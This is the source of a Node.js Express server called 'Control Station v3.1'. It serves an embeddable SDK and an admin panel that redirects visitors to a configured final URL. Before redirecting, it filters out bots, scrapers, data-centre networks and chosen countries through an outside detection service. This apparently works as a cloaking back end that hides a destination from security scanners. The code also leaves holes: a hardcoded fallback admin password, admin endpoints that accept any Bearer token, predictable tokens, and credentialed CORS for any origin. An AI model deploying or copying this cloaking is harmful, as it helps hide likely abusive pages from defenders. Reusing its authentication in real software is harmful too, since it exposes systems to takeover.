const express = require('express');
const cors = require('cors');
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');
const fs = require('fs').promises;
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;
const CONFIG_PATH = path.join(__dirname, 'config.json');
const THEMES_PATH = path.join(__dirname, 'themes.json');

const getAdminPassword = () => process.env.ADMIN_PASSWORD || 'cyberpunk2024';

// Load config function
async function loadConfig() {
  try {
    const data = await fs.readFile(CONFIG_PATH, 'utf8');
    const fileConfig = JSON.parse(data);
    app.locals.config = { ...fileConfig, adminPassword: getAdminPassword() };
    return app.locals.config;
  } catch (error) {
    const defaultConfig = {
      adminPassword: getAdminPassword(),
      finalUrl: 'https://msod.skope.net.au',
      botDetectionEnabled: true,
      blockingCriteria: { minScore: 0.7, blockBotUA: true, blockScraperISP: true, blockIPAbuser: true, blockSuspiciousTraffic: false, blockDataCenterASN: true },
      allowedDomains: [],
      allowAllDomains: false,
      allowedCountries: [],
      blockedCountries: ["North Korea", "Iran", "Russia"],
      ipBlacklist: ["192.168.1.1"],
      theme: "default",
      lastUpdated: new Date().toISOString()
    };
    app.locals.config = defaultConfig;
    try { await saveConfig(defaultConfig); } catch (e) {}
    return defaultConfig;
  }
}

async function saveConfig(config) {
  config.lastUpdated = new Date().toISOString();
  app.locals.config = config;
  await fs.writeFile(CONFIG_PATH, JSON.stringify(config, null, 2));
}

// Middleware to ensure config is loaded FIRST
app.use(async (req, res, next) => {
  if (!req.app.locals.config) {
    await loadConfig();
  }
  next();
});

// Security middleware
app.use(helmet({ contentSecurityPolicy: false }));
app.use(express.json({ limit: '10mb' }));

// ===== CRITICAL FIX: Add CORP header for sdk.js =====
app.use('/sdk.js', (req, res, next) => {
  const origin = req.get('origin');
  const config = req.app.locals.config;
  const allowedDomains = config.allowedDomains || [];
  const allowAllDomains = config.allowAllDomains || false;

  const isOriginAllowed = (originToCheck) => {
    if (!originToCheck) return true;
    if (allowAllDomains) return true;
    try {
      const originHostname = new URL(originToCheck).hostname;
      return allowedDomains.some(domain => 
        originHostname === domain || originHostname.endsWith('.' + domain)
      );
    } catch {
      return false;
    }
  };

  if (isOriginAllowed(origin)) {
    // THIS IS THE FIX: Allow cross-origin embedding
    res.setHeader('Cross-Origin-Resource-Policy', 'cross-origin');
    res.setHeader('Access-Control-Allow-Origin', origin || '*');
    res.setHeader('Access-Control-Allow-Credentials', 'true');
    res.setHeader('Vary', 'Origin');
    next();
  } else {
    res.status(403).json({ error: 'ERR-DOMAIN-BLOCKED' });
  }
});

// Serve static files (after CORP header is set for sdk.js)
app.use(express.static('public'));

// CORS for API endpoints
app.use((req, res, next) => {
  const origin = req.get('origin');
  const config = req.app.locals.config;
  const allowedDomains = config.allowedDomains || [];
  const allowAllDomains = config.allowAllDomains || false;

  const isOriginAllowed = (originToCheck) => {
    if (!originToCheck) return true;
    if (allowAllDomains) return true;
    try {
      const originHostname = new URL(originToCheck).hostname;
      return allowedDomains.some(domain => 
        originHostname === domain || originHostname.endsWith('.' + domain)
      );
    } catch {
      return false;
    }
  };

  if (req.path.startsWith('/api')) {
    if (isOriginAllowed(origin)) {
      cors({ origin: origin || true, credentials: true })(req, res, next);
    } else {
      res.status(403).json({ error: 'ERR-DOMAIN-BLOCKED' });
    }
    return;
  }

  if (req.method === 'OPTIONS') {
    res.setHeader('Access-Control-Allow-Origin', origin || '*');
    res.setHeader('Access-Control-Allow-Credentials', 'true');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization, X-SDK-Version');
    res.setHeader('Vary', 'Origin');
    return res.status(200).end();
  }

  next();
});

// Rate limiting
const limiter = rateLimit({ windowMs: 15 * 60 * 1000, max: 100, message: { error: 'ERR-RATE-LIMIT' } });
app.use('/api/', limiter);

// API Routes (unchanged)
app.get('/api/config', async (req, res) => {
  try {
    const config = req.app.locals.config;
    res.json({
      botDetectionEnabled: config.botDetectionEnabled,
      blockingCriteria: config.blockingCriteria,
      allowedCountries: config.allowedCountries,
      blockedCountries: config.blockedCountries,
      ipBlacklist: config.ipBlacklist,
      finalUrl: config.finalUrl,
      theme: config.theme,
      allowedDomains: config.allowedDomains,
      allowAllDomains: config.allowAllDomains,
      lastUpdated: config.lastUpdated
    });
  } catch { res.status(500).json({ error: 'ERR-CONFIG-LOAD' }); }
});

app.get('/api/themes', async (req, res) => {
  try {
    const data = await fs.readFile(THEMES_PATH, 'utf8');
    res.json(JSON.parse(data));
  } catch { res.status(500).json({ error: 'ERR-THEMES-LOAD' }); }
});

app.post('/api/bot-detect', async (req, res) => {
  try {
    const { ip, user_agent } = req.body;
    const response = await fetch('https://bad-defender-production.up.railway.app/api/detect_bot', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ ip, user_agent })
    });
    res.json(await response.json());
  } catch { res.status(500).json({ error: 'ERR-BOT-DETECT' }); }
});

app.get('/api/geoip/:ip', async (req, res) => {
  try {
    const { ip } = req.params;
    const response = await fetch(`https://ipapi.co/${ip}/json/`);
    const data = await response.json();
    res.json({ country: data.country_name || 'Unknown', ip: data.ip || ip });
  } catch { res.status(500).json({ error: 'ERR-GEOIP' }); }
});

app.post('/api/admin/login', async (req, res) => {
  const { password } = req.body;
  const config = req.app.locals.config;

  if (password === config.adminPassword) {
    res.json({ success: true, token: 'admin-session-' + Date.now() });
  } else {
    res.status(401).json({ error: 'ERR-INVALID-PASS' });
  }
});

app.get('/api/admin/config', async (req, res) => {
  const authHeader = req.headers.authorization;
  if (!authHeader?.startsWith('Bearer ')) {
    return res.status(401).json({ error: 'ERR-NO-AUTH' });
  }
  res.json(req.app.locals.config);
});

app.post('/api/admin/config', async (req, res) => {
  const authHeader = req.headers.authorization;
  if (!authHeader?.startsWith('Bearer ')) {
    return res.status(401).json({ error: 'ERR-NO-AUTH' });
  }

  try {
    const newConfig = req.body;
    const oldConfig = req.app.locals.config;
    newConfig.adminPassword = newConfig.adminPassword || oldConfig.adminPassword;
    await saveConfig(newConfig);
    res.json({ success: true, lastUpdated: newConfig.lastUpdated });
  } catch {
    res.status(500).json({ error: 'ERR-CONFIG-SAVE' });
  }
});

app.get('/health', (req, res) => {
  res.json({ status: 'OK', code: 'HEALTHY' });
});

// Start server
app.listen(PORT, '0.0.0.0', async () => {
  await loadConfig();
  console.log(`🚀 Control Station v3.1 running on port ${PORT}`);
  console.log(`📊 Admin: http://localhost:${PORT}/admin.html`);
  console.log(`🎯 SDK: http://localhost:${PORT}/sdk.js`);
  console.log(`🔒 Domain whitelist active: ${app.locals.config.allowAllDomains ? 'DISABLED' : 'ENABLED'}`);
});
